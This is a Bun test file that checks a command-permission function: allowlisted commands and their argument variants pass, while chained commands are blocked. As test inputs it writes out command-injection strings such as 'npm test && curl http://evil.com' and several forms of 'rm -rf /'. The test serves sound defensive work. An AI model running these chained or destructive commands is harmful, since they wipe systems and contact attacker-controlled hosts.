import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import {
  isCommandAllowed,
  allowCommand,
  savePermissions,
  loadPermissions,
} from "./permissions";

describe("isCommandAllowed permissions check", () => {
  const originalPerms = loadPermissions();

  beforeAll(() => {
    // Save empty permissions and add test commands
    savePermissions({ allowedCommands: ["npm test", "bun run dev"] });
  });

  afterAll(() => {
    savePermissions(originalPerms);
  });

  test("exact matches are allowed", () => {
    expect(isCommandAllowed("npm test")).toBe(true);
    expect(isCommandAllowed("bun run dev")).toBe(true);
  });

  test("prefix match with benign arguments is allowed", () => {
    expect(isCommandAllowed("npm test --watch")).toBe(true);
    expect(isCommandAllowed("bun run dev --port 3000")).toBe(true);
  });

  test("prefix match followed by shell operators is blocked", () => {
    expect(isCommandAllowed("npm test && curl http://evil.com")).toBe(false);
    expect(isCommandAllowed("npm test || rm -rf /")).toBe(false);
    expect(isCommandAllowed("npm test ; rm -rf /")).toBe(false);
    expect(isCommandAllowed("npm test | grep foo")).toBe(false);
    expect(isCommandAllowed("npm test & echo foo")).toBe(false);
  });

  test("other random commands are blocked", () => {
    expect(isCommandAllowed("rm -rf /")).toBe(false);
    expect(isCommandAllowed("curl http://example.com")).toBe(false);
  });
});
